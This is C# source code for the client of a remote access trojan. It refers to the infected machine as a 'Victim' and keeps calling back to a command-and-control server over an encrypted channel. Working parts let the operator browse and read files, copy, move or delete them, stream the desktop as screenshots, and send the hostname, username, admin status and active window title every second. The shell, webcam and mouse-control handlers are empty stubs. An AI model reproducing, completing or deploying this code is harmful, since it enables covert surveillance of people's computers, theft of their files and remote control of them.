using System.Linq.Expressions;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;

namespace Client
{
    internal class DSP
    {
        //HEADER
        public const int HEADER_SIZE = 6; //6 BYTES
        public byte _Command = 0;
        public byte Command { get { return _Command; } }
        public byte _Param = 0;
        public byte Param { get { return _Param; } }
        private int _DataLength = 0;
        public int DataLength { get { return _DataLength; } }

        //DATA
        private byte[] _MessageData = new byte[0];
        private byte[] MessageData = new byte[0];
        private byte[] _MoreData = new byte[0];
        public byte[] MoreData { get { return _MoreData; } }

        //CONSTRUCTOR-1
        public DSP(byte[] buffer)
        {
            if (buffer == null || buffer.Length < HEADER_SIZE)
                return;

            //BUFFER INFORMATION
            using (MemoryStream ms = new MemoryStream(buffer))
            {
                using (BinaryReader br = new BinaryReader(ms))
                {
                    try
                    {
                        //HEADER
                        _Command = br.ReadByte(); // 1 BYTE
                        _Param = br.ReadByte(); // 1 BYTE
                        _DataLength = br.ReadInt32(); // READ 4 BYTES

                        if (buffer.Length - HEADER_SIZE >= DataLength)
                            _MessageData = br.ReadBytes(_DataLength);
                        if (buffer.Length - HEADER_SIZE - DataLength > 0)
                            _MoreData = br.ReadBytes(buffer.Length - HEADER_SIZE - _DataLength);
                    }
                    catch (Exception ex)
                    {

                    }
                }
            }
        }
        //CONSTRUCTOR-2
        public DSP(byte cmd, byte para, byte[] msg)
        {
            _Command = cmd;
            _Param = para;
            _MessageData = msg;
            _DataLength = msg.Length;
        }

        public byte[] GetBytes()
        {
            try
            {
                byte[] bytes = null;
                MemoryStream ms = new MemoryStream();
                BinaryWriter bw = new BinaryWriter(ms);
                bw.Write(_Command);
                bw.Write(_Param);
                bw.Write(_DataLength);
                bw.Write(_MessageData);
                bytes = ms.ToArray();
                bw.Close();
                ms.Close();

                return bytes;
            }
            catch (Exception ex)
            {
                return new byte[0];
            }
        }

        public (byte cmd, byte para, int len, byte[] msg) GetMsg()
        {
            (byte cmd, byte para, int len, byte[] msg) ret = (
                _Command,
                _Param,
                _MessageData.Length,
                _MessageData
                );
            
            return ret;
        }

        public static (byte cmd, byte para, int len) GetHeader(byte[] buf)
        {
            (byte cmd, byte para, int len) ret = (0, 0, 0);
            if (buf == null || buf.Length < HEADER_SIZE)
                return ret;

            ret.cmd = buf[0];
            ret.para = buf[1];
            ret.len = BitConverter.ToInt32(buf, 2);

            return ret;
        }
    }
    internal class Victim
    {
        public Socket socket;
        public static int MAX_BUFFER_LENGTH = 65536;
        public byte[] buffer = new byte[MAX_BUFFER_LENGTH]; 
        public string server_ip;
        public int server_port;

        //CRYPTOGRAPHY
        public (string public_key, string private_key) key_pairs;
        public (byte[] key, byte[] iv) _AES;

        public Victim(Socket socket)
        {
            this.socket = socket;
        }

        public void Send(int cmd, int param, byte[] msg)
        {
            if (msg != null)
            {
                byte[] buffer = new DSP((byte)cmd, (byte)param, msg).GetBytes();
                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.Partial, new AsyncCallback((ar) =>
                {
                    try
                    {
                        socket.EndSend(ar);
                    }
                    catch (Exception ex)
                    {

                    }
                }), buffer);
            }
        }
        public void Send(int cmd, int param, string msg)
        {
            Send(cmd, param, Encoding.UTF8.GetBytes(msg));
        }
        public void encSend(int cmd, int param, string data)
        {
            string enc_data = Crypto.AESEncrypt(data, _AES.key, _AES.iv);
            Send(cmd, param, enc_data);
        }
    }
    internal class Crypto
    {
        static int rsa_keySize = 4096;
        static int aes_keySize = 256;
        static int block_size = 128;

        public static string[] CreateRSAKey()
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.KeySize = rsa_keySize;

            string publicKey = rsa.ToXmlString(false);
            string privateKey = rsa.ToXmlString(true);

            return new string[] { publicKey, privateKey };
        }
        public static byte[] RSAEncrypt(string data, string publicKey)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.KeySize = rsa_keySize;
            rsa.FromXmlString(publicKey);

            byte[] eVal = rsa.Encrypt(Encoding.UTF8.GetBytes(data), false);

            return eVal;
        }
        public static byte[] RSADecrypt(byte[] data, string privateKey)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.KeySize = rsa_keySize;
            rsa.FromXmlString(privateKey);

            byte[] dVal = rsa.Decrypt(data, false);
            return dVal;
        }

        public static string AESEncrypt(string plain_text, byte[] key, byte[] iv)
        {
            byte[] cipher_bytes = null;
            using (Aes aes = Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.KeySize = aes_keySize;
                aes.BlockSize = block_size;
                aes.Key = key;
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                        {
                            sw.Write(plain_text);
                        }
                        cipher_bytes = ms.ToArray();
                    }
                }
            }

            return Convert.ToBase64String(cipher_bytes);
        }
        public static string AESDecrypt(byte[] cipher_bytes, byte[] key, byte[] iv)
        {
            string plain_text = null;
            using (Aes aes = Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.KeySize = aes_keySize;
                aes.BlockSize = block_size;
                aes.Key = key;
                aes.IV = iv;

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                using (MemoryStream ms = new MemoryStream(cipher_bytes))
                {
                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            plain_text = sr.ReadToEnd();
                        }
                    }
                }
            }


            return plain_text;
        }
        public static (string key, string iv) AES_GenerateKeyAndIV()
        {
            string key = null;
            string iv = null;
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.GenerateKey();
                aes.GenerateIV();
                
                key = b64E2Str(aes.Key);
                iv = b64E2Str(aes.IV);
            }

            return (key, iv);
        }

        public static string b64E2Str(string data) { return Convert.ToBase64String(Encoding.UTF8.GetBytes(data)); }
        public static string b64E2Str(byte[] data) { return Convert.ToBase64String(data); }
        public static byte[] b64E2Bytes(string data) { return Encoding.UTF8.GetBytes(b64E2Str(data)); }
        public static byte[] b64E2Bytes(byte[] data) { return Encoding.UTF8.GetBytes(b64E2Str(data)); }
        public static string b64D2Str(string data) { return Encoding.UTF8.GetString(Convert.FromBase64String(data)); }
        public static string b64D2Str(byte[] data) { return Encoding.UTF8.GetString(data); }
        public static byte[] b64D2Bytes(string data) { return Convert.FromBase64String(data); }
        public static byte[] b64D2Bytes(byte[] data) { return b64D2Bytes(Encoding.UTF8.GetString(data)); }
    }
    internal class Webcam
    {

    }

    internal class FuncFile
    {
        public string cp; //CURRENT PATH
        public DriveInfo[] drivers;

        public FuncFile()
        {
            cp = Application.StartupPath;
            drivers = DriveInfo.GetDrives();
        }

        public string BytesNormalize(long bytes_size)
        {
            if (bytes_size < 1024)
                return $"{bytes_size} Bytes";
            else if (bytes_size < Math.Pow(1024, 1))
                return $"{bytes_size / 1024.0:F2} KB";
            else if (bytes_size < 1024 * 1024 * 1024)
                return $"{bytes_size / (1024.0 * 1024):F2} MB";
            else if (bytes_size < 1024L * 1024 * 1024 * 1024)
                return $"{bytes_size / (1024.0 * 1024 * 1024):F2} GB";
            else
                return $"{bytes_size / (1024.0 * 1024 * 1024 * 1024):F2} TB";
        }

        public string GetDrives()
        {
            string[] d = drivers.Select(x => string.Join(",", new string[]
            {
                x.Name.Replace("\\", string.Empty), //DRIVER NAME
                x.DriveType.ToString(), //DRIVER TYPE
                BytesNormalize(x.TotalSize), //TOTAL SIZE
                BytesNormalize(x.AvailableFreeSpace), //AVAILABLE SPACE
                x.VolumeLabel, //VOLUME LABEL
            })).ToArray();
            return string.Join("-", d);
        }

        public string ScanDir(string path, int dir_limit, int file_limit)
        {
            List<string[]> l_dir = new List<string[]>();
            List<string[]> l_file = new List<string[]>();

            int dir_cnt = 0;
            int file_cnt = 0;

            foreach (string dir in Directory.GetDirectories(path))
            {
                bool is_readonly = false;
                bool is_writable = false;

                string tmp_file = Path.Combine(dir, "tmp_" + Guid.NewGuid() + ".txt");
                try { File.Create(tmp_file).Close(); File.Delete(tmp_file); is_writable = true; } catch(Exception ex) { Console.WriteLine(ex.Message); }
                try { Directory.GetFiles(dir); is_readonly = true; } catch { }

                DirectoryInfo info = new DirectoryInfo(dir);
                l_dir.Add(new string[]
                {
                    dir,
                    "X",
                    (is_readonly ? "R" : string.Empty) + (is_writable ? "W" : string.Empty),
                    info.Attributes.ToString(),
                    info.CreationTime.ToString("F"),
                    info.LastWriteTime.ToString("F"),
                    info.LastAccessTime.ToString("F"),
                });

                if (dir_limit == -1)
                    continue;

                dir_cnt++;
                if (dir_cnt == dir_limit)
                    break;
            }

            foreach (string file in Directory.GetFiles(path))
            {
                FileInfo info = new FileInfo(file);
                FileAttributes attr = File.GetAttributes(file);
                bool is_readonly = (attr & FileAttributes.ReadOnly) == FileAttributes.ReadOnly;

                l_file.Add(new string[]
                {
                    info.FullName,
                    BytesNormalize(info.Length),
                    is_readonly ? "R" : "RW",
                    info.Attributes.ToString(),
                    info.CreationTime.ToString("F"),
                    info.LastWriteTime.ToString("F"),
                    info.LastAccessTime.ToString("F"),
                });

                if (file_limit == -1)
                    continue;

                file_cnt++;
                if (file_cnt == file_limit)
                    break;
            }

            return string.Join("+", l_dir.Select(x => string.Join(";", x))) + "|" + string.Join("+", l_file.Select(x => string.Join(";", x)));
        }

        public string CopyFile(string src, string dst)
        {
            try { File.Copy(src, dst); return "1"; }
            catch (Exception ex) { return ex.Message; }
        }

        public string MoveFile(string src, string dst)
        {
            try { File.Move(src, dst); return "1"; }
            catch (Exception ex) { return ex.Message; }
        }

        public string DeleteFile(string dst)
        {
            try { File.Delete(dst); return "1"; }
            catch (Exception ex) { return ex.Message; }
        }

        public string ReadFile(string dst)
        {
            try { return File.ReadAllText(dst); }
            catch (Exception ex) { return ex.Message; }
        }
    }
    internal class FuncTask
    {

    }
    internal class FuncConn
    {

    }

    internal class Program
    {
        static string ip = "127.0.0.1";
        static int port = 5000;

        static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        static bool is_connected = false;

        //--------------[ START OF WINDOWS API ]--------------\\
        //ACTIVE WINDOW TITLE
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hwnd, StringBuilder text, int count);

        //--------------[ END OF WINDOWS API ]--------------\\

        //CMD PIPELINE
        static Process cmd_proc;
        static StreamWriter cmdSw_in;

        //REMOTE DESKTOP
        static bool send_screenshot = false;
        static bool send_stopped = true;

        //MANAGER
        static FuncFile funcFile;
        static FuncTask funcTask;
        static FuncConn funcConn;

        static byte[] CombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            byte[] bytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(first_bytes, first_idx, first_len);
                ms.Write(second_bytes, second_idx, second_len);
                bytes = ms.ToArray();
            }

            return bytes;
        }

        static void Received(Victim v)
        {
            try
            {
                Socket socket = v.socket;
                DSP dsp = null;
                int recv_len = 0;
                byte[] static_recvBuf = new byte[Victim.MAX_BUFFER_LENGTH];
                byte[] dynamic_recvBuf = new byte[] { };
                v.Send(1, 0, "Hello");
                do
                {
                    static_recvBuf = new byte[Victim.MAX_BUFFER_LENGTH];
                    recv_len = v.socket.Receive(static_recvBuf);
                    dynamic_recvBuf = CombineBytes(dynamic_recvBuf, 0, dynamic_recvBuf.Length, static_recvBuf, 0, recv_len);
                    if (recv_len <= 0)
                        break;
                    else if (dynamic_recvBuf.Length < DSP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var head_info = DSP.GetHeader(dynamic_recvBuf);
                        while (dynamic_recvBuf.Length - DSP.HEADER_SIZE >= head_info.len)
                        {
                            dsp = new DSP(dynamic_recvBuf);
                            dynamic_recvBuf = dsp.MoreData;
                            head_info = DSP.GetHeader(dynamic_recvBuf);
                            if (dsp.Command == 0) //DISCONNECT
                            {
                                if (dsp.Param == 0)
                                {
                                    
                                }
                            }
                            else if (dsp.Command == 1) //KEY EXCHANGE
                            {
                                if (dsp.Param == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
                                {
                                    string rsa_publicKey = Crypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
                                    rsa_publicKey = Crypto.b64D2Str(rsa_publicKey);
                                    v.key_pairs.public_key = rsa_publicKey;
                                    var aes = Crypto.AES_GenerateKeyAndIV();
                                    v._AES.key = Convert.FromBase64String(aes.key);
                                    v._AES.iv = Convert.FromBase64String(aes.iv);
                                    string payload = aes.key + "|" + aes.iv;
                                    byte[] enc_payload = Crypto.RSAEncrypt(payload, rsa_publicKey);
                                    v.Send(1, 1, enc_payload);
                                }
                                else if (dsp.Param == 2) //CHALLENGE AND RESPONSE
                                {
                                    byte[] buffer = dsp.GetMsg().msg;
                                    string payload = Encoding.UTF8.GetString(buffer);
                                    buffer = Convert.FromBase64String(payload);
                                    payload = Crypto.AESDecrypt(buffer, v._AES.key, v._AES.iv);
                                    payload = Convert.ToBase64String(Crypto.RSAEncrypt(payload, v.key_pairs.public_key));
                                    payload = Crypto.AESEncrypt(payload, v._AES.key, v._AES.iv);
                                    v.Send(1, 3, payload);
                                }
                                else if (dsp.Param == 4)
                                {
                                    new Thread(() => SendInfo(v)).Start();
                                }
                            }
                            else if (dsp.Command == 2) //COMMAND AND CONTROL
                            {
                                if (dsp.Param == 0) //RECEIVED COMMAND
                                {
                                    string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                    payload = Crypto.AESDecrypt(Convert.FromBase64String(payload), v._AES.key, v._AES.iv);
                                    _Received(v, payload);
                                }
                                else if (dsp.Param == 1) //PIGN TIME, LATENCY
                                {
                                    v.encSend(2, 1, DateTime.Now.ToString("F"));
                                }
                            }
                        }
                    }
                }
                while (recv_len > 0 && is_connected);
            }
            catch (Exception ex)
            {
                is_connected = false;
                return;
            }
        }

        static void _Received(Victim v, string msg)
        {
            try
            {
                string[] cmd = msg.Split('|');
                if (cmd[0] == "file")
                {
                    if (cmd[1] == "init")
                    {
                        funcFile = new FuncFile();
                        string cp = funcFile.cp;
                        string driver_info = funcFile.GetDrives();
                        v.encSend(2, 0, $"file|init|{cp}|{driver_info}");
                    }
                    else if (cmd[1] == "sd") //SCAN DIR
                    {
                        string dir = cmd[2];
                        int dir_limit = int.Parse(cmd[3]);
                        int file_limit = int.Parse(cmd[4]);
                        string data = funcFile.ScanDir(dir, dir_limit, file_limit);
                        v.encSend(2, 0, $"file|sd|" + dir + "|" + data);
                    }
                }
                else if (cmd[0] == "task")
                {

                }
                else if (cmd[0] == "conn")
                {

                }
                else if (cmd[0] == "shell")
                {
                    
                }
                else if (cmd[0] == "desktop")
                {
                    if (cmd[1] == "init")
                    {
                        DesktopInit(v);
                    }
                    else if (cmd[1] == "start" || cmd[1] == "screenshot")
                    {
                        string[] tmp = cmd[2].Split('|');
                        string device_name = tmp[0];
                        int width = int.Parse(tmp[1]);
                        int height = int.Parse(tmp[2]);

                        if (cmd[1] == "start")
                        {
                            send_screenshot = false;
                            while (!send_stopped)
                                Thread.Sleep(100);

                            send_screenshot = true;
                            send_stopped = false;
                            new Thread(() => DesktopStart(v, device_name, width, height)).Start();
                        }
                        else
                        {
                            new Thread(() => v.encSend(2, 0, "desktop|screenshot|" + ScreenShot(v, device_name, width, height))).Start();
                        }
                    }
                    else if (cmd[1] == "stop")
                    {
                        send_screenshot = false;
                    }
                }
                else if (cmd[0] == "mouse")
                {
                    if (cmd[1] == "move")
                    {

                    }
                    else if (cmd[1] == "sendkey")
                    {

                    }
                    else if (cmd[1] == "lock")
                    {

                    }
                    else if (cmd[1] == "ulock")
                    {

                    }
                    else if (cmd[1] == "crazy")
                    {

                    }
                    else if (cmd[1] == "calm")
                    {

                    }
                }
                else if (cmd[0] == "webcam")
                {
                    if (cmd[1] == "start")
                    {
                        Webcam webcam = new Webcam();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void Shell(Victim v)
        {
           
        }

        static string BitmapToBase64(Bitmap bitmap)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                byte[] image_bytes = ms.ToArray();
                return Convert.ToBase64String(image_bytes);
            }
        }
        static int FindDesktopIndex(string device_name)
        {
            int idx = 0;
            for (int i = 0; i < Screen.AllScreens.Length; i++)
            {
                if (Screen.AllScreens[i].DeviceName.Equals(device_name, StringComparison.OrdinalIgnoreCase))
                {
                    idx = i;
                    break;
                }
            }

            return idx;
        }
        static string ScreenShot(Victim v, string device_name, int width, int height)
        {
            int idx = FindDesktopIndex(device_name);
            Bitmap bitmap = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
            Rectangle capture_rect = Screen.AllScreens[idx].Bounds;
            Graphics capture_graphics = Graphics.FromImage(bitmap);
            capture_graphics.CopyFromScreen(capture_rect.Left, capture_rect.Top, 0, 0, capture_rect.Size);
            string b64_image = BitmapToBase64(bitmap);

            return b64_image;
        }
        static void DesktopStart(Victim v, string device_name, int width, int height)
        {
            while (is_connected && send_screenshot)
            {
                string b64_img = ScreenShot(v, device_name, width, height);
                v.encSend(2, 0, "desktop|start|" + b64_img);
                Thread.Sleep(10);
            }
            send_stopped = true;
        }
        static void DesktopInit(Victim v)
        {
            List<string> result = new List<string>();
            foreach (var screen in Screen.AllScreens)
            {
                var bounds = screen.Bounds;
                string name = screen.DeviceName;
                int left = bounds.Left;
                int top = bounds.Top;
                int width = bounds.Width;
                int height = bounds.Height;
                result.Add($"{name},{left},{top},{width},{height}");
            }
            string data = string.Join("+", result);
            v.encSend(2, 0, "desktop|init|" + data);
        }

        static void FunStuff()
        {

        }

        static string getOS()
        {
            string result = RuntimeInformation.OSDescription;
            return result;
        }

        static string getCPU()
        {
            string result = null;
            using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
            {
                // Call NextValue() once to initialize the counter
                cpuCounter.NextValue();
                System.Threading.Thread.Sleep(1000); // Wait for a second to get a valid reading

                // Get CPU usage percentage
                float cpuUsage = cpuCounter.NextValue();
                result = ((int)cpuUsage).ToString() + "%";
            }
            return result;
        }

        static string GetActiveWindowTitle()
        {
            const int nChars = 512;
            StringBuilder sb = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, sb, nChars) > 0)
                return sb.ToString();
            else
                return "";
        }

        static bool isAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void SendInfo(Victim v)
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            while (is_connected)
            {

                string info = string.Join("|", new string[]
                {
                    "info",
                    Dns.GetHostName(),
                    Environment.UserName,
                    isAdmin() ? "Yes" : "No",
                    getOS(),
                    "", //PING
                    getCPU(), //CPU
                    Screen.AllScreens.Length.ToString(), //MONITOR
                    "", //WEBCAM
                    Crypto.b64E2Str(GetActiveWindowTitle()),
                    ScreenShot(v, Screen.PrimaryScreen.DeviceName, bounds.Width, bounds.Height),
                });
                v.encSend(2, 0, info);

                Thread.Sleep(1000);
            }
        }

        static void Connect()
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(ip, port);
                Victim v = new Victim(socket);
                //socket.BeginReceive(v.buffer, 0, v.buffer.Length, SocketFlags.None, new AsyncCallback(Received), v);
                new Thread(() => Received(v)).Start();
                is_connected = true;
            }
            catch (SocketException ex)
            {
                return;
            }
        }

        static void Main(string[] args)
        {
            while (true)
            {
                if (!is_connected)
                {
                    Connect();
                }

                Thread.Sleep(1000);
            }
        }
    }
}